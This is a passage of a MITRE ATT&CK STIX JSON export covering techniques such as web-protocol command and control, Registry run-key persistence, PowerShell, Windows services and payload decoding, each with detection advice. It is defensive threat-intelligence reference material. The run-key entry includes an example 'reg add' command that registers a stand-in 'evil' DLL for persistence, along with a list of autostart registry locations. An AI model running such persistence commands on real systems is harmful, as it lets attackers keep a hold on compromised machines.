            "description": "Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP and HTTPS that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ",
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "command-and-control"
                }
            ],
            "x_mitre_detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)\n\nMonitor for web traffic to/from known-bad or suspicious domains. ",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1071/001",
                    "external_id": "T1071.001",
                    "source_name": "mitre-attack"
                },
                {
                    "source_name": "University of Birmingham C2",
                    "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
                    "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"
                }
            ]
        },
        {
            "type": "attack-pattern",
            "modified": "2021-01-06T18:36:29.226Z",
            "name": "Registry Run Keys / Startup Folder",
            "x_mitre_data_sources": [
                "Windows Registry: Windows Registry Key Creation",
                "Windows Registry: Windows Registry Key Modification",
                "File: File Modification",
                "Command: Command Execution",
                "Process: Process Creation"
            ],
            "x_mitre_version": "1.1",
            "created": "2020-01-23T22:02:48.566Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "persistence"
                },
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "privilege-escalation"
                }
            ],
            "x_mitre_permissions_required": [
                "Administrator",
                "User"
            ],
            "x_mitre_platforms": [
                "Windows"
            ],
            "x_mitre_is_subtechnique": true,
            "id": "attack-pattern--9efb1ea7-c37b-4595-9640-b7680cd84279",
            "description": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. (Citation: Microsoft RunOnceEx APR 2018) For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit</code> and <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell</code> subkeys can automatically launch programs.\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run when any user logs on.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.",
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "x_mitre_contributors": [
                "Oddvar Moe, @oddvarmoe"
            ],
            "x_mitre_detection": "Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders. (Citation: TechNet Autoruns) Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1547/001",
                    "external_id": "T1547.001",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://capec.mitre.org/data/definitions/270.html",
                    "external_id": "CAPEC-270",
                    "source_name": "capec"
                },
                {
                    "source_name": "Microsoft Run Key",
                    "description": "Microsoft. (n.d.). Run and RunOnce Registry Keys. Retrieved November 12, 2014.",
                    "url": "http://msdn.microsoft.com/en-us/library/aa376977"
                },
                {
                    "url": "https://docs.microsoft.com/en-us/windows/win32/sysinfo/32-bit-and-64-bit-application-data-in-the-registry",
                    "description": "Microsoft. (2018, May 31). 32-bit and 64-bit Application Data in the Registry. Retrieved August 3, 2020.",
                    "source_name": "Microsoft Wow6432Node 2018"
                },
                {
                    "url": "https://blog.malwarebytes.com/cybercrime/2013/10/hiding-in-plain-sight/",
                    "description": "Arntz, P. (2016, March 30). Hiding in Plain Sight. Retrieved August 3, 2020.",
                    "source_name": "Malwarebytes Wow6432Node 2016"
                },
                {
                    "source_name": "Microsoft RunOnceEx APR 2018",
                    "description": "Microsoft. (2018, August 20). Description of the RunOnceEx Registry Key. Retrieved June 29, 2018.",
                    "url": "https://support.microsoft.com/help/310593/description-of-the-runonceex-registry-key"
                },
                {
                    "source_name": "Oddvar Moe RunOnceEx Mar 2018",
                    "description": "Moe, O. (2018, March 21). Persistence using RunOnceEx - Hidden from Autoruns.exe. Retrieved June 29, 2018.",
                    "url": "https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/"
                },
                {
                    "source_name": "TechNet Autoruns",
                    "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
                    "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "Command and Scripting Interpreter",
            "x_mitre_data_sources": [
                "Command: Command Execution",
                "Process: Process Creation",
                "Module: Module Load",
                "Script: Script Execution"
            ],
            "x_mitre_version": "2.2",
            "modified": "2021-08-16T21:03:21.700Z",
            "created": "2017-05-31T21:30:49.546Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "execution"
                }
            ],
            "id": "attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830",
            "revoked": false,
            "x_mitre_platforms": [
                "Linux",
                "macOS",
                "Windows",
                "Network"
            ],
            "x_mitre_is_subtechnique": false,
            "x_mitre_permissions_required": [
                "User"
            ],
            "description": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nThere are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).\n\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)",
            "x_mitre_remote_support": true,
            "x_mitre_detection": "Command-line and scripting activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools. Also monitor for loading of modules associated with specific languages.\n\nIf scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information discovery, collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1059",
                    "external_id": "T1059",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.1",
                    "description": "Microsoft. (2020, August 21). Running Remote Commands. Retrieved July 26, 2021.",
                    "source_name": "Powershell Remote Commands"
                },
                {
                    "url": "https://tools.cisco.com/security/center/resources/integrity_assurance.html#23",
                    "description": "Cisco. (n.d.). Cisco IOS Software Integrity Assurance - Command History. Retrieved October 21, 2020.",
                    "source_name": "Cisco IOS Software Integrity Assurance - Command History"
                },
                {
                    "url": "https://www.thepythoncode.com/article/executing-bash-commands-remotely-in-python",
                    "description": "Abdou Rockikz. (2020, July). How to Execute Shell Commands in a Remote Machine in Python. Retrieved July 26, 2021.",
                    "source_name": "Remote Shell Execution in Python"
                }
            ]
        },
        {
            "type": "attack-pattern",
            "modified": "2021-05-28T14:56:23.748Z",
            "name": "PowerShell",
            "x_mitre_data_sources": [
                "Command: Command Execution",
                "Module: Module Load",
                "Process: Process Creation",
                "Script: Script Execution"
            ],
            "x_mitre_version": "1.1",
            "created": "2020-03-09T13:48:55.078Z",
            "x_mitre_contributors": [
                "Praetorian"
            ],
            "id": "attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736",
            "x_mitre_platforms": [
                "Windows"
            ],
            "x_mitre_is_subtechnique": true,
            "x_mitre_permissions_required": [
                "User",
                "Administrator"
            ],
            "description": "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)",
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "execution"
                }
            ],
            "x_mitre_remote_support": true,
            "x_mitre_detection": "If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.\n\nMonitor for loading and/or execution of artifacts associated with PowerShell specific assemblies, such as System.Management.Automation.dll (especially to unusual process names/locations).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)\n\nIt is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution (which is applied to .NET invocations). (Citation: Malware Archaeology PowerShell Cheat Sheet) PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.(Citation: FireEye PowerShell Logging 2016) An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1059/001",
                    "external_id": "T1059.001",
                    "source_name": "mitre-attack"
                },
                {
                    "source_name": "TechNet PowerShell",
                    "description": "Microsoft. (n.d.). Windows PowerShell Scripting. Retrieved April 28, 2016.",
                    "url": "https://technet.microsoft.com/en-us/scriptcenter/dd742419.aspx"
                },
                {
                    "source_name": "Github PSAttack",
                    "description": "Haight, J. (2016, April 21). PS>Attack. Retrieved June 1, 2016.",
                    "url": "https://github.com/jaredhaight/PSAttack"
                },
                {
                    "url": "http://www.sixdub.net/?p=367",
                    "description": "Warner, J.. (2015, January 6). Inexorable PowerShell \u2013 A Red Teamer\u2019s Tale of Overcoming Simple AppLocker Policies. Retrieved December 8, 2018.",
                    "source_name": "Sixdub PowerPick Jan 2016"
                },
                {
                    "url": "https://silentbreaksecurity.com/powershell-jobs-without-powershell-exe/",
                    "description": "Christensen, L.. (2015, December 28). The Evolution of Offensive PowerShell Invocation. Retrieved December 8, 2018.",
                    "source_name": "SilentBreak Offensive PS Dec 2015"
                },
                {
                    "url": "https://blogs.msdn.microsoft.com/kebab/2014/04/28/executing-powershell-scripts-from-c/",
                    "description": "Babinec, K. (2014, April 28). Executing PowerShell scripts from C#. Retrieved April 22, 2019.",
                    "source_name": "Microsoft PSfromCsharp APR 2014"
                },
                {
                    "source_name": "Malware Archaeology PowerShell Cheat Sheet",
                    "description": "Malware Archaeology. (2016, June). WINDOWS POWERSHELL LOGGING CHEAT SHEET - Win 7/Win 2008 or later. Retrieved June 24, 2016.",
                    "url": "http://www.malwarearchaeology.com/s/Windows-PowerShell-Logging-Cheat-Sheet-ver-June-2016-v2.pdf"
                },
                {
                    "source_name": "FireEye PowerShell Logging 2016",
                    "description": "Dunwoody, M. (2016, February 11). GREATER VISIBILITY THROUGH POWERSHELL LOGGING. Retrieved February 16, 2016.",
                    "url": "https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html"
                }
            ]
        },
        {
            "type": "attack-pattern",
            "modified": "2020-09-16T15:49:58.490Z",
            "name": "Windows Service",
            "x_mitre_data_sources": [
                "Service: Service Creation",
                "Service: Service Modification",
                "Process: Process Creation",
                "Process: OS API Execution",
                "Command: Command Execution",
                "Windows Registry: Windows Registry Key Creation",
                "Windows Registry: Windows Registry Key Modification"
            ],
            "x_mitre_version": "1.1",
            "created": "2020-01-17T19:13:50.402Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "persistence"
                },
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "privilege-escalation"
                }
            ],
            "x_mitre_platforms": [
                "Windows"
            ],
            "x_mitre_is_subtechnique": true,
            "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
            "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry. Service configurations can be modified using utilities such as sc.exe and [Reg](https://attack.mitre.org/software/S0075). \n\nAdversaries may install a new service or modify an existing service by using system utilities to interact with services, by directly modifying the Registry, or by using custom tools to interact with the Windows API. Adversaries may configure services to execute at startup in order to persist on a system.\n\nAn adversary may also incorporate [Masquerading](https://attack.mitre.org/techniques/T1036) by using a service name from a related operating system or benign software, or by modifying existing services to make detection analysis more challenging. Modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used. \n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges from administrator to SYSTEM. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002). ",
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "x_mitre_contributors": [
                "Matthew Demaske, Adaptforward",
                "Travis Smith, Tripwire",
                "Pedro Harrison"
            ],
            "x_mitre_effective_permissions": [
                "Administrator",
                "SYSTEM"
            ],
            "x_mitre_detection": "Monitor processes and command-line arguments for actions that could create or modify services. Command-line invocation of tools capable of adding or modifying services may be unusual, depending on how systems are typically used in a particular environment. Services may also be modified through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), so additional logging may need to be configured to gather the appropriate data. Remote access tools with built-in features may also interact directly with the Windows API to perform these functions outside of typical system utilities. Collect service utility execution and service binary path arguments used for analysis. Service binary paths may even be changed to execute commands or scripts.  \n\nLook for changes to service Registry entries that do not correlate with known software, patch cycles, etc. Service information is stored in the Registry at <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. Changes to the binary path and the service startup type changed from manual or disabled to automatic, if it does not typically do so, may be suspicious. Tools such as Sysinternals Autoruns may also be used to detect system service changes that could be attempts at persistence.(Citation: TechNet Autoruns)  \n\nCreation of new services may generate an alterable event (ex: Event ID 4697 and/or 7045 (Citation: Microsoft 4697 APR 2017)(Citation: Microsoft Windows Event Forwarding FEB 2018)). New, benign services may be created during installation of new software.\n\nSuspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data. Look for abnormal process call trees from known services and for execution of other commands that could relate to Discovery or other adversary techniques. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1543/003",
                    "external_id": "T1543.003",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://capec.mitre.org/data/definitions/478.html",
                    "external_id": "CAPEC-478",
                    "source_name": "capec"
                },
                {
                    "url": "https://capec.mitre.org/data/definitions/550.html",
                    "external_id": "CAPEC-550",
                    "source_name": "capec"
                },
                {
                    "url": "https://capec.mitre.org/data/definitions/551.html",
                    "external_id": "CAPEC-551",
                    "source_name": "capec"
                },
                {
                    "source_name": "TechNet Services",
                    "description": "Microsoft. (n.d.). Services. Retrieved June 7, 2016.",
                    "url": "https://technet.microsoft.com/en-us/library/cc772408.aspx"
                },
                {
                    "source_name": "TechNet Autoruns",
                    "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
                    "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902"
                },
                {
                    "source_name": "Microsoft 4697 APR 2017",
                    "description": "Miroshnikov, A. & Hall, J. (2017, April 18). 4697(S): A service was installed in the system. Retrieved August 7, 2018.",
                    "url": "https://docs.microsoft.com/windows/security/threat-protection/auditing/event-4697"
                },
                {
                    "source_name": "Microsoft Windows Event Forwarding FEB 2018",
                    "description": "Hardy, T. & Hall, J. (2018, February 15). Use Windows Event Forwarding to help with intrusion detection. Retrieved August 7, 2018.",
                    "url": "https://docs.microsoft.com/windows/security/threat-protection/use-windows-event-forwarding-to-assist-in-intrusion-detection"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "Standard Encoding",
            "x_mitre_data_sources": [
                "Network Traffic: Network Traffic Content"
            ],
            "x_mitre_version": "1.0",
            "modified": "2020-03-14T23:36:52.095Z",
            "created": "2020-03-14T23:36:52.095Z",
            "x_mitre_permissions_required": [
                "User"
            ],
            "x_mitre_platforms": [
                "Linux",
                "macOS",
                "Windows"
            ],
            "x_mitre_is_subtechnique": true,
            "id": "attack-pattern--04fd5427-79c7-44ea-ae13-11b24778ff1c",
            "description": "Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "command-and-control"
                }
            ],
            "x_mitre_detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1132/001",
                    "external_id": "T1132.001",
                    "source_name": "mitre-attack"
                },
                {
                    "source_name": "Wikipedia Binary-to-text Encoding",
                    "description": "Wikipedia. (2016, December 26). Binary-to-text encoding. Retrieved March 1, 2017.",
                    "url": "https://en.wikipedia.org/wiki/Binary-to-text_encoding"
                },
                {
                    "source_name": "Wikipedia Character Encoding",
                    "description": "Wikipedia. (2017, February 19). Character Encoding. Retrieved March 1, 2017.",
                    "url": "https://en.wikipedia.org/wiki/Character_encoding"
                },
                {
                    "source_name": "University of Birmingham C2",
                    "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
                    "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "Deobfuscate/Decode Files or Information",
            "x_mitre_data_sources": [
                "Process: Process Creation",
                "File: File Modification",
                "Script: Script Execution"
            ],
            "x_mitre_version": "1.1",
            "modified": "2020-07-09T14:42:23.122Z",
            "created": "2017-12-14T16:46:06.044Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "defense-evasion"
                }
            ],
            "id": "attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c",
            "x_mitre_defense_bypassed": [
                "Anti-virus",
                "Host intrusion prevention systems",
                "Signature-based detection",
                "Network intrusion detection system"
            ],
            "x_mitre_platforms": [
                "Windows",
                "Linux",
                "macOS"
            ],
            "x_mitre_is_subtechnique": false,
            "x_mitre_permissions_required": [
                "User"
            ],
            "description": "Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file. (Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload. (Citation: Carbon Black Obfuscation Sept 2016)\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016)",
            "x_mitre_contributors": [
                "Matthew Demaske, Adaptforward",
                "Red Canary"
            ],
            "x_mitre_detection": "Detecting the action of deobfuscating or decoding files or information may be difficult depending on the implementation. If the functionality is contained within malware and uses the Windows API, then attempting to detect malicious behavior before or after the action may yield better results than attempting to perform analysis on loaded libraries or API calls. If scripts are used, then collecting the scripts for analysis may be necessary. Perform process and command-line monitoring to detect potentially malicious behavior related to scripts and system utilities such as [certutil](https://attack.mitre.org/software/S0160).\n\nMonitor the execution file paths and command-line arguments for common archive file applications and extensions, such as those for Zip and RAR archive tools, and correlate with other suspicious behavior to reduce false positives from normal user and administrator behavior.",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1140",
                    "external_id": "T1140",
                    "source_name": "mitre-attack"
                },
                {
                    "source_name": "Malwarebytes Targeted Attack against Saudi Arabia",
                    "description": "Malwarebytes Labs. (2017, March 27). New targeted attack against Saudi Arabia Government. Retrieved July 3, 2017.",
                    "url": "https://blog.malwarebytes.com/cybercrime/social-engineering-cybercrime/2017/03/new-targeted-attack-saudi-arabia-government/"
                },
                {
                    "source_name": "Carbon Black Obfuscation Sept 2016",
                    "description": "Tedesco, B. (2016, September 23). Security Alert Summary. Retrieved February 12, 2018.",
                    "url": "https://www.carbonblack.com/2016/09/23/security-advisory-variants-well-known-adware-families-discovered-include-sophisticated-obfuscation-techniques-previously-associated-nation-state-attacks/"
                },
                {
                    "source_name": "Volexity PowerDuke November 2016",
                    "description": "Adair, S.. (2016, November 9). PowerDuke: Widespread Post-Election Spear Phishing Campaigns Targeting Think Tanks and NGOs. Retrieved January 11, 2017.",
                    "url": "https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/"
                }
            ]
        },
        {
            "type": "attack-pattern",
            "modified": "2021-07-28T01:37:46.704Z",
            "name": "Drive-by Compromise",
            "x_mitre_data_sources": [
                "File: File Creation",
                "Process: Process Creation",
                "Network Traffic: Network Connection Creation",
                "Network Traffic: Network Traffic Content",
                "Application Log: Application Log Content"
            ],
            "x_mitre_version": "1.3",
            "created": "2018-04-18T17:59:24.739Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "initial-access"
                }
            ],
            "x_mitre_permissions_required": [
                "User"
            ],
            "x_mitre_platforms": [
                "Windows",
                "Linux",
                "macOS",
                "SaaS"
            ],
            "x_mitre_is_subtechnique": false,
            "id": "attack-pattern--d742a578-d70e-4d0e-96a6-02a9c30204e6",
